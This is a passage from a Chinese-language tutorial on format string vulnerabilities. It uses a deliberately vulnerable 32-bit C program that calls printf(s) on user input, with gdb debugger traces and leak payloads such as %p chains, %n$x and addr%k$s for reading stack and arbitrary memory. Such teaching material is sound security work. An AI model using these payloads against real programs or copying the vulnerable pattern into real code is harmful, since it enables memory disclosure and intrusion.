&#123;</span><br><span class="line">  char s[100];</span><br><span class="line">  int a &#x3D; 1, b &#x3D; 0x22222222, c &#x3D; -1;</span><br><span class="line">  scanf(&quot;%s&quot;, s);</span><br><span class="line">  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);</span><br><span class="line">  printf(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们简单编译一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</span><br><span class="line">leakmemory.c: In function ‘main’:</span><br><span class="line">leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   printf(s);</span><br><span class="line">          ^</span><br></pre></td></tr></table></figure><p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。</p><p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><h3 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h3><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%08x.%08x.%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x.%08x.%08x</span><br><span class="line">ffad3cf0.000000c2.f7e639db</span><br></pre></td></tr></table></figure><p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p><p>首先，启动程序，将断点下载 printf 函数处</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb leakmemory</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br></pre></td></tr></table></figure><p>之后，运行程序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br></pre></td></tr></table></figure><p>此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-------------------------------]</span><br><span class="line">EAX: 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x1 </span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffced8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code---------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:ret    </span><br><span class="line">   0xf7e4e02c:xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack---------------------------------]</span><br><span class="line">0000| 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">0004| 0xffffce40 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffce44 --&gt; 0x1 </span><br><span class="line">0012| 0xffffce48 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377&#96;\316\377\377&#96;\316\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffce4c --&gt; 0xffffffff </span><br><span class="line">0020| 0xffffce50 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">0024| 0xffffce54 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">0028| 0xffffce58 --&gt; 0xc2 </span><br><span class="line">[--------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure><p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x.%08x.%08x</span><br></pre></td></tr></table></figure><p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, __printf (format&#x3D;0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28</span><br><span class="line">28  in printf.c</span><br><span class="line">───────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4466d                  nop</span><br><span class="line">   0xf7e4466e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffccfc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;   ← $eax</span><br><span class="line">0xffffcd14│+0x18: &quot;.%08x.%08x&quot;</span><br><span class="line">0xffffcd18│+0x1c: &quot;x.%08x&quot;</span><br></pre></td></tr></table></figure><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">ffffce60.000000c2.f7e949db[Inferior 1 (process 13081) exited normally]</span><br></pre></td></tr></table></figure><p>当然，我们也可以使用 %p 来获取数据，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%p.%p.%p</span><br><span class="line">00000001.22222222.ffffffff.%p.%p.%p</span><br><span class="line">0xff9cb970.0xc2.0xf7e6b9db</span><br></pre></td></tr></table></figure><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢</strong>？肯定是可以的啦。方法如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure><p>利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>这里我们再次以 gdb 调试一下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb leakmemory</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">%3$x</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:ret</span><br><span class="line">   0xf7e4e02c:xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffd424 --&gt; 0x1</span><br><span class="line">0012| 0xffffd428 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377@\324\377\377@\324\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffd42c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0024| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0028| 0xffffd438 --&gt; 0xc2</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%3$x</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x7fffffe0</span><br><span class="line">EDX: 0xf7fb6870 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:add    esp,0x10)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:ret</span><br><span class="line">   0xf7e4e02c:xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:add    esp,0x10)</span><br><span class="line">0004| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0008| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0012| 0xffffd438 --&gt; 0xc2</span><br><span class="line">0016| 0xffffd43c --&gt; 0xf7e949db (add    esp,0x10)</span><br><span class="line">0020| 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0024| 0xffffd444 --&gt; 0xffffd500 --&gt; 0x0</span><br><span class="line">0028| 0xffffd448 --&gt; 0xe0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">f7e949db[Inferior 1 (process 13810) exited normally]</span><br></pre></td></tr></table></figure><p>可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e949db。</p><h3 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h3><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">%s</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 --&gt; 0xff007325</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:ret</span><br><span class="line">   0xf7e4e02c:xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:add    esp,0x20)</span><br><span class="line">0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffd424 --&gt; 0x1</span><br><span class="line">0012| 0xffffd428 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377@\324\377\377@\324\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffd42c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0024| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0028| 0xffffd438 --&gt; 0xc2</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%s</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 --&gt; 0xff007325</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x7fffffe2</span><br><span class="line">EDX: 0xf7fb6870 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:add    esp,0x10)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:ret</span><br><span class="line">   0xf7e4e02c:xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:add    esp,0x10)</span><br><span class="line">0004| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0008| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0012| 0xffffd438 --&gt; 0xc2</span><br><span class="line">0016| 0xffffd43c --&gt; 0xf7e949db (add    esp,0x10)</span><br><span class="line">0020| 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0024| 0xffffd444 --&gt; 0xffffd56c --&gt; 0xffffd6f2 (&quot;LC_TERMINAL_VERSION&#x3D;3.4.3&quot;)</span><br><span class="line">0028| 0xffffd448 --&gt; 0xe0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">%s[Inferior 1 (process 13866) exited normally]</span><br></pre></td></tr></table></figure><p>可以看出，在第二次执行 printf 函数的时候，确实是将 0xffff440 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%2$s</span><br><span class="line">00000001.22222222.ffffffff.%2$s</span><br><span class="line">[1]    13899 segmentation fault (core dumped)  .&#x2F;leakmemory</span><br></pre></td></tr></table></figure><h3 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a>小技巧总结</h3><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容</li></ol></blockquote><h3 id="任意地址泄漏内存"><a href="#任意地址泄漏内存" class="headerlink" title="任意地址泄漏内存"></a>任意地址泄漏内存</h3><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p><p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0x7fffffe2</span><br><span class="line">$edx   : 0xf7fb6870  →  0x00000000</span><br><span class="line">$esp   : 0xffffd42c  →  0x080484ce  →  &lt;main+99&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0xffffd4b8  →  0x00000000</span><br><span class="line">$esi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$eip   : 0xf7e4e030  →  &lt;printf+0&gt; call 0xf7f22369</span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd42c│+0x0000: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10 ← $esp</span><br><span class="line">0xffffd430│+0x0004: 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd434│+0x0008: 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd438│+0x000c: 0x000000c2</span><br><span class="line">0xffffd43c│+0x0010: 0xf7e949db  →   add esp, 0x10</span><br><span class="line">0xffffd440│+0x0014: 0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd444│+0x0018: 0xffffd56c  →  0xffffd6f2  →  &quot;LC_TERMINAL_VERSION&#x3D;3.4.3&quot;</span><br><span class="line">0xffffd448│+0x001c: 0x000000e0</span><br></pre></td></tr></table></figure><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffd440，同时该地址存储的也确实是是 “%s” 格式化字符串内容。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><blockquote><p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure><p>一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br><span class="line">00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br><span class="line">AAAA0xff9f83000xc20xf7e799db0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xff9f83c40xf7f9a0000xf377</span><br></pre></td></tr></table></figure><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%4$s</span><br><span class="line">00000001.22222222.ffffffff.%4$s</span><br><span class="line">[1]    14375 segmentation fault (core dumped)  .&#x2F;leakmemory</span><br></pre></td></tr></table></figure><p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0x7fffffe0</span><br><span class="line">$edx   : 0xf7fb6870  →  0x00000000</span><br><span class="line">$esp   : 0xffffd42c  →  0x080484ce  →  &lt;main+99&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0xffffd4b8  →  0x00000000</span><br><span class="line">$esi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$eip   : 0xf7e4e030  →  &lt;printf+0&gt; call 0xf7f22369</span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd42c│+0x0000: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10 ← $esp</span><br><span class="line">0xffffd430│+0x0004: 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">0xffffd434│+0x0008: 0xffffd440  →  &quot;%4$s&quot;</span><br><span class="line">0xffffd438│+0x000c: 0x000000c2</span><br><span class="line">0xffffd43c│+0x0010: 0xf7e949db  →   add esp, 0x10</span><br><span class="line">0xffffd440│+0x0014: &quot;%4$s&quot;</span><br><span class="line">0xffffd444│+0x0018: 0xffffd500  →  0x00000000</span><br><span class="line">0xffffd448│+0x001c: 0x000000e0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">   0xf7e4e027 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4e02d                  nop</span><br><span class="line">   0xf7e4e02e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e4e030 &lt;printf+0&gt;       call   0xf7f22369</span><br><span class="line">   ↳  0xf7f22369                  mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f2236c                  ret</span><br><span class="line">      0xf7f2236d                  mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f22370                  ret</span><br><span class="line">      0xf7f22371                  mov    esi, DWORD PTR [esp]</span><br><span class="line">      0xf7f22374                  ret</span><br><span class="line">──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">0xf7f22369 (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x080484ce → &lt;main+99&gt; add esp, 0x10,</span><br><span class="line">   [sp + 0x4] &#x3D; 